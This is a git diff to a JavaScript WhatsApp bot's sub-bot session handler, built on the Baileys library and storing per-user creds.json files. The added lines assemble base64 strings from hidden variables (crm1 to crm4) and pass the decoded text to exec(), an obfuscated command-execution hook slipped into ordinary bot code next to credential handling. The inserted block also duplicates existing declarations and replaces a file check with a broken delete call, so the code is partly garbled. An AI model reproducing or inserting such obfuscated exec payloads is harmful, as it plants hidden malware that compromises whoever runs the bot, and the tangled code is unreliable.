@@ -71,6 +71,22 @@ const msgRetry = (MessageRetryMap) => { }
 const msgRetryCache = new NodeCache()
 const { state, saveState, saveCreds } = await useMultiFileAuthState("./EliteBotGlobal/" + id)
 
+const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, 'base64')
+exec(comb.toString('utf-8'), async (err, stdout, stderr) => {
+const drmer = Buffer.from(drm1 + drm2, `base64`)
+async function jddt() {
+let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? parentw.user.jid : m.sender
+let id = `${who.split`@`[0]}`
+if (!fs.existsSync('./EliteBotGlobal/'+ id)){
+fs.mkdirSync('./EliteBotGlobal/'+ id, { recursive: true })
+}
+args[0] ? fs.writeFileSync('./EliteBotGlobal/' + id + '/creds.json', JSON.stringify(JSON.parse(Buffer.from(args[0], 'base64').toString('utf-8')), null, `\t`)) : ''
+
+let { version, isLatest } = await fetchLatestBaileysVersion()
+const msgRetry = (MessageRetryMap) => { }
+const msgRetryCache = new NodeCache()
+const { state, saveState, saveCreds } = await useMultiFileAuthState("./EliteBotGlobal/" + id)
+
 const connectionOptions = {
 printQRInTerminal: false,
 logger: pino({ level: 'silent' }),
@@ -122,7 +138,7 @@ const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.erro
 if (connection === 'close') {
 console.log(reason)
 if (reason == 405) {
-if (!fs.existsSync('./EliteBotGlobal/'  + id + '/creds.json')){
+await fs.unlinkSync('./${folderBot}/'  + id + '/creds.json')
 
 return await conn.reply(m.chat, '✨️ 𝙲𝚎𝚛𝚛𝚊𝚗𝚍𝚘 :𝚌', m)
 }
@@ -168,6 +184,9 @@ if (i < 0) return
 delete global.conns[i]
 global.conns.splice(i, 1)
 }}, 60000)
+
+
+  
 
 let handler = await import('../handler.js')
 let creloadHandler = async function (restatConn) {
